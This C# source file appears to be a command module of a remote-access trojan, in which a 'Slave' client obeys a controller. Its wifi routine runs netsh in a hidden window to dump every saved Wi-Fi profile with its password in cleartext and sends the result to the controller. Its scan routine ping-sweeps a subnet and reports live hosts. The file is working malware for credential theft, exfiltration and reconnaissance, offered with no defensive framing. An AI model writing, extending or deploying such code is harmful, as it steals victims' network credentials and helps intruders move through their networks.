using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;

namespace Slave.Commands
{
    internal class NetInfo : ICommand
    {
        public string name { get; } = "netinfo";

        List<string> upHosts = new List<string>();

        static CountdownEvent countdown;

        public void Process(List<string> args)
        {
            if (args[0] == "wifi")
            {
                WifiInfos();
            }
            else
            {
                Scan(args[1]);
            }
        }

        void WifiInfos()
        {
            // Get wifi profiles names
            var cmd = "/C netsh wlan show profiles";
            var proc = new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    StandardOutputEncoding = Encoding.GetEncoding(850)
                }
            };
            proc.Start();

            var profiles = proc.StandardOutput.ReadToEnd()
                .Split('\n')
                .Where(x => x.Contains(':') && x.Length > 5)
                .Skip(1)
                .Select(x => x.Substring(x.LastIndexOf(':') + 2, x.Length - x.LastIndexOf(':') - 3))
                .ToList();
            proc.WaitForExit();

            // For each profile, get its informations, including the clear stored key
            var data = "";
            foreach (var profile in profiles)
            {
                proc.StartInfo.Arguments = $"/C netsh wlan show profile \"{profile}\" key=clear";
                proc.Start();
                data += proc.StandardOutput.ReadToEnd();
            }
            data += "{end}";

            SlaveCommandsManager.networkManager.WriteLine(data);
        }

        void Scan(string ipMask)
        {
            upHosts.Clear();
            countdown = new CountdownEvent(1);

            var firstAndLastIpInt = GetFirstAndLastIpInt(ipMask);
            for (int i = firstAndLastIpInt.Item1; i <= firstAndLastIpInt.Item2; i++)
            {
                var bytes = BitConverter.GetBytes(i);
                var ip = new IPAddress(new[] { bytes[3], bytes[2], bytes[1], bytes[0] });
                var ping = new Ping();
                ping.PingCompleted += PingCompletedEventHandler;

                countdown.AddCount();
                ping.SendAsync(ip, 100, ip);
            }

            countdown.Signal();
            countdown.Wait();

            SlaveCommandsManager.networkManager.WriteLine(upHosts.Count > 0
                ? upHosts.Aggregate((x, y) => $"{x}|{y}")
                : "KO");
        }

        void PingCompletedEventHandler(object sender, PingCompletedEventArgs e)
        {
            if (e.Reply != null && e.Reply.Status == IPStatus.Success)
            {
                upHosts.Add(e.UserState.ToString());
            }

            countdown.Signal();
        }

        #region Ip calculations

        static Tuple<int, int> GetFirstAndLastIpInt(string ipAndMask)
        {
            var separatorPos = ipAndMask.IndexOf('/');
            var stringIp = ipAndMask.Substring(0, separatorPos);
            var bits = int.Parse(ipAndMask.Substring(separatorPos + 1));

            var ip = stringIp.Split('.').Select(x => (byte)int.Parse(x)).ToArray();
            uint mask = ~(uint.MaxValue >> bits);

            // BitConverter gives bytes in opposite order to GetAddressBytes().
            var maskBytes = BitConverter.GetBytes(mask).Reverse().ToArray();

            var startIPBytes = new byte[ip.Length];
            var endIPBytes = new byte[ip.Length];

            // Calculate the bytes of the start and end IP addresses.
            for (var i = 0; i < ip.Length; i++)
            {
                startIPBytes[i] = (byte)(ip[i] & maskBytes[i]);
                endIPBytes[i] = (byte)(ip[i] | ~maskBytes[i]);
            }

            return new Tuple<int, int>(ByteArrayIpToInt(startIPBytes), ByteArrayIpToInt(endIPBytes));
        }

        static int ByteArrayIpToInt(byte[] ip)
        {
            var array = ip.Reverse().ToArray();
            return BitConverter.ToInt32(array, 0);
        }

        #endregion Ip calculations
    }
}
